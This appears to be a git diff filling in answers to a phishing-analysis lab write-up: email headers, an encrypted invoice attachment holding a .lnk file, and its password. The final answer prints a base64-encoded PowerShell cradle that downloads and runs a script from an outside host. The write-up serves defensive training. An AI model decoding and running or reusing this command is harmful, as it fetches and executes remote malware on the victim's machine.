@@ -70,24 +70,46 @@ If we check the recipient of the email, we find that the answer is: julianne.wes
 
 ### 3. What is the name of the third-party mail relay service used by the attacker based on the `DKIM-Signature` and `List-Unsubscribe` headers?
 
-**Your Answer:**
+To find this information with Thunderbird, we need to view the source and find the appropriate headers. 
+
+![2025-06-17T15_37_24](https://github.com/user-attachments/assets/c31842ff-77f6-4119-bea3-e11771387754)
+
+Once we do so, we find that the third-party mail relay service is: elasticemail
 
 ---
 
 ### 4. What is the name of the file inside the encrypted attachment?
 
-**Your Answer:**
+To find this information, I downloaded the encrypted attachment to the artefacts directory and used the password provided in the dump.eml file to extract the file. 
+
+![image](https://github.com/user-attachments/assets/2788c98c-a595-43a0-8905-f2d7895dc68b)
+
+Once finished, we see that the name of the file is: Invoice_20230103.lnk
 
 ---
 
 ### 5. What is the password of the encrypted attachment?
 
-**Your Answer:**
+As previously mentioned, we can find this information in the dump.eml file using Thunderbird. 
+
+The answer is: Invoice2023!
 
 ---
 
 ### 6. Based on the result of the `lnkparse` tool, what is the encoded payload found in the `Command Line Arguments` field?
 
-**Your Answer:**
+To find this information, we need to open up the terminal. From there we type the command, lnkparse *file name/destination*, as shown in the image below.
+
+![image](https://github.com/user-attachments/assets/8d25a237-a0a3-40c3-9a98-3da95f44edd7)
+
+Once we execute the command, we can find the answer in the output, as shown in the image below.
+
+![image](https://github.com/user-attachments/assets/36778e16-0495-4127-977a-1911b3338083)
+
+The answer is: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
+
+
+
+
 
 ---
